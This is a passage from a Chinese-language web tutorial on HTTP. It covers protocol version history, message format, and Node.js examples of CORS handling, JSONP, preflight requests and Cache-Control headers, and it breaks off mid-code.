的小幅度修正。但一个重要的区别是：它是一个“正式的标准”。这意味着今后互联网上所有的浏览器、服务器、网关、代理等等，只要用到 HTTP 协议，就必须严格遵守这个标准。HTTP/1.1 开启了后续的“Web 1.0”“Web 2.0”时代。</p><p>  由于 HTTP/1.1 太过庞大和复杂，所以在 2014 年又做了一次修订，原来的一个大文档被拆分成了六份较小的文档，编号为 7230-7235，优化了一些细节，但此外没有任何实质性的改动。</p><p>​</p><h4 id="HTTP-2">HTTP/2</h4><ul><li><p>所有数据以二进制传输，不再是纯文本</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li><li><p>可发起多个请求，废弃了 1.1 里的管道</p></li><li><p>增强了安全性</p></li></ul><p>​</p><p>  Google 开发了自己的浏览器 Chrome，然后推出了新的 <code>SPDY 协议</code>，并在 Chrome 里应用于自家的服务器，开启了第二次的“浏览器大战”。这次的胜利者是 Google，Chrome 目前的全球的占有率超过了 60%。Google 借此顺势把 <code>SPDY</code> 推上了标准的宝座，互联网标准化组织以 <code>SPDY</code> 为基础开始制定新版本的 HTTP 协议，最终<strong>在 2015 年发布了 HTTP/2，RFC 编号 7540</strong></p><p>​</p><blockquote><p>HTTP2的优势：</p><ol><li><p>信道复用</p></li><li><p>分帧传输：传输数据不需要连续的发送，可以分成不同的帧进行发送</p></li><li><p>Server Push：使服务端可以主动的向客户端发送内容</p></li></ol></blockquote><p>​</p><h4 id="HTTP-3">HTTP/3</h4><p>  在 HTTP/2 还处于草案之时，Google 又发明了一个新的协议 <code>QUIC</code>，依托其的庞大用户量和数据量，持续地推动 <code>QUIC 协议</code>成为互联网上的“既成事实”。</p><p>  2018 年，互联网标准化组织 IETF 提议将“HTTP over QUIC”更名为“HTTP/3”并获得批准，HTTP/3 正式进入了标准化制订阶段，也许两三年后就会正式发布，到时候我们很可能会跳过 HTTP/2 直接进入 HTTP/3。</p><p>​</p><h4 id="总结-3">总结</h4><ol><li>HTTP 协议始于三十年前蒂姆·伯纳斯 - 李的一篇论文</li><li>HTTP/0.9 是个简单的文本协议，只能获取文本资源</li><li>HTTP/1.0 确立了大部分现在使用的技术，但它不是正式标准</li><li>HTTP/1.1 是目前互联网上使用最广泛的协议，功能也非常完善</li><li>HTTP/2 基于 Google 的 SPDY 协议，注重性能改善，但还未普及</li><li>HTTP/3 基于 Google 的 QUIC 协议，是将来的发展方向</li></ol><p>​</p><p>​</p><h3 id="1-4-HTTP报文格式">1.4 HTTP报文格式</h3><img src="image-20210207223800223.png" alt="HTTP协议格式" style="zoom: 67%;"><p>请求报文</p><ul><li><p>HTTP 协议是以 ASCII 码传输，建立在 TCP/IP 协议之上的应用层规范</p></li><li><p>规范把 HTTP 请求分为三个部分：状态行、请求头、消息主体</p></li></ul><p>HTTP方法：</p><ul><li>用来定义对于资源的操作</li><li>常用的有GET、POST、PUT、DELETE等</li><li>从定义上讲有各自的语义</li></ul><p>HTTP CODE：</p><ul><li><p>定义服务器对请求的处理结果</p></li><li><p>各个区间的CODE有各自的语义</p></li><li><p>好的HTTP服务可以通过CODE判断结果</p></li></ul><p>​</p><p>​</p><p>​</p><h3 id="1-5-一个简单web服务">1.5 一个简单web服务</h3><p>创建一个基于node.js的简单的Web服务，然后在浏览器输出localhost:8000就可以得到返回值了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8000'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="image-20210122212153947.png" alt="启动web服务" style="zoom: 90%;"><img src="image-20210122212317288.png" alt="成功加载" style="zoom: 80%;"><p>​</p><p>​</p><p>​</p><h2 id="2-HTTP的特性">2. HTTP的特性</h2><h3 id="2-1-HTTP客户端">2.1 HTTP客户端</h3><p>浏览器：<a href="http://xn--baidu-ep5hk31azrbeet66u3pxdtso.com">浏览器地址输入baidu.com</a>，就会返回响应内容。General就是http的首行，它并不属于http报文，它不仅返回内容，还处理了返回内容，如Response</p><img src="331769-20181129064014294-1238237602.png" alt="Google浏览器" style="zoom: 50%;"><img src="浏览器发起 HTTP 请求的典型场景.png" alt="浏览器发起 HTTP 请求的典型场景" style="zoom:60%;"><p>​curl：<a href="http://xn--baidu-bl8j211c1fuhh7b.com">直接请求baidu.com</a>，返回如下，而浏览器会去识别这个标签，<a href="http://xn--www-7j2ej9fsa616ko85bnkzd.baidu.com">然后重定向到www.baidu.com</a></p><img src="image-20210122215211846.png" alt="curl工具"><p><img src="image-20210122220156659.png" alt=""></p><p>​</p><h3 id="2-2-CORS-跨域请求">2.2 CORS 跨域请求</h3><h4 id="2-2-1-同域限制">2.2.1 同域限制</h4><p><code>server1.js</code>：8880端口服务，返回<code>test.html</code>页面</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8880</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8880'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>test.html</code>：向8887端口服务发起一个跨域的请求</p><blockquote><p>  跨域资源共享<strong>CORS</strong> 是一种机制，它使用额外的 HTTP 头来告诉浏览器  让运行在一个 origin （domain）上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求。</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">//XMLHttpRequest和Fetch API遵循同源策略,这意味着使用这些API的Web应用只能从同一个域请求HTTP资源，除非使用CORS头文件</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1:8887/'</span><span class="token punctuation">)</span>  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>server2.js</code>：8887端口服务</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210123164813202.png" alt="跨域请求报错"></p><p>解决方法：在添加<code>server2.js</code>中添加代码如下（浏览器在解析请求返回的内容时发现没有Access-Control-Allow-Origin设置为允许，会将返回内容忽略掉并报错）</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里就可以指定域名来访问服务器，从而实现安全的跨域请求 ，也可以通过判断request.url来进行不同的跨域请求设置</p><blockquote><p>提示：浏览器会认为localhost与127.0.0.1是跨域</p></blockquote><h4 id="2-2-2-jsonp实现跨域请求">2.2.2 jsonp实现跨域请求</h4><p>直接在<code>test.html</code>中使用srcipt标签来实现跨域，这样就不需要在服务器设置Access-Control-Allow-Origin属性了</p><p>浏览器允许link、img、script标签上面的src或者是ref跨域来实现的</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8887<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-3-CORS预请求">2.2.3 CORS预请求</h4><p>修改<code>test.html</code>文件，刷新页面后再次发生跨域的报错</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://localhost:8887'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    headers<span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token string">'X-Test-Cors'</span><span class="token operator">:</span> <span class="token string">'123'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210123180145542.png" alt=""></p><p>报错原因：</p><p>​跨域资源共享标准（ cross-origin sharing standard ）允许在下列场景中使用跨域 HTTP 请求：</p><ul><li>由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求</li><li>Web 字体 （CSS 中通过<code>@font-face</code>使用跨域字体资源）</li><li>WebGL 贴图</li><li>使用 drawImage 将 Images/video 画面绘制到 canvas</li><li>样式表（使用 CSSOM）</li></ul><p>在发生跨域时的限制：</p><ul><li><p>允许的方法默认只有：<code>GET</code>、<code>HEAD</code>、<code>POST</code>，其他的方法是默认不允许的（其他方法就需要进行预请求）</p></li><li><p>允许<code>Content-Type</code>：<code>text/plain</code>、<code>multipart/form-data</code>、<code>application/x-www-form-urlencoded</code>,其他的也需要预请求</p></li><li><p>其他限制：请求头限制(<a href="https://fetch.spec.whatwg.org/#cors-safelisted-request-header">Fetch</a>)、XMLHttpRequestUpload对象均没有注册任何事件监听器、请求中没有使用ReadableStream对象</p></li></ul><p>解决方法：修改<code>server2.js</code>文件的请求头信息</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">,</span>    <span class="token string">'Access-Control-Allow-Headers'</span><span class="token operator">:</span> <span class="token string">'X-Test-Cors'</span><span class="token punctuation">,</span>    <span class="token string">'Access-Control-Allow-Methods'</span><span class="token operator">:</span> <span class="token string">'POST, PUT, DELETE'</span><span class="token punctuation">,</span>    <span class="token string">'Access-Control-Max-Age'</span><span class="token operator">:</span> <span class="token string">'1000'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>浏览器比之前多了一个请求，即预请求</p><p><img src="image-20210123181435164.png" alt=""></p><p>​<br>​</p><h3 id="2-3-缓存Cache-Control">2.3 缓存Cache-Control</h3><h4 id="2-3-1-可缓存性">2.3.1 可缓存性</h4><ul><li>public：http请求返回的过程中，在Cache-Control中设置了public的值，代表在这个http请求中返回的内容所经过的任何路径（包括中间的一些http的代理服务器以及发出这个请求的客户端浏览器）都可以对返回内容进行缓存的操作</li><li>private：只有发起请求的浏览器才可以进行缓存</li><li>no-cache：不可以直接使用缓存</li></ul><blockquote><p>no-cache可以在本地、proxy服务器进行缓存，但是每次发起请求都要去服务器验证(2.5 资源验证)；如果服务器返回允许使用这部分缓存，才可以使用缓存</p></blockquote><h4 id="2-3-2-到期">2.3.2 到期</h4><ul><li>max-age=<seconds>：设置这个缓存到多少秒过期</seconds></li><li>s-maxage=<seconds>：s-maxage代替max-age，在代理服务器里才会生效，在客户端浏览器不会读取这个属性</seconds></li><li>ma-stale=<seconds>：在max-age过期之后，如果我们返回的资源有这个max-stale的设置，发起请求的一方主动带的一个头，即便max-age过期了，只要在max-stale这个时间内依然可以使用这个过期的缓存，而不需要去原服务器请求（注意：只有在发起端设置才有用）</seconds></li></ul><h4 id="2-3-3-重新验证">2.3.3 重新验证</h4><ul><li>must-revalidate：在max-age过期了，我们必须到原服务端去发送这个请求来重新获取这部分数据，再来验证这部分内容是不是真的过期了，而不能直接使用本地的缓存</li><li>proxy-revalidate：用在缓存服务器的，指在缓存服务器过期之后，必须到原服务端去发送这个请求来重新获取这部分数据，再来验证这部分内容是不是真的过期了，而不能直接使用本地的缓存</li></ul><h4 id="2-3-4-其他">2.3.4 其他</h4><ul><li>no-store：本地和代理服务器都是不可以缓存，每次都要去服务器端拿新的body内容</li><li>no-transform：用在proxy服务器，告诉proxy服务器不可以随意改变返回的内容（例如不能随便压缩返回的图片）</li></ul><blockquote><p>注意：上面这些头只是一个限制性、声明性的作用，它没有任何强制的约束力</p></blockquote><p>示例代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/script.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/script.js'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/javascript'</span><span class="token punctuation">,</span>      <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=20'</span> <span class="token comment">// 设置缓存</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'console.log("script loaded")'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token 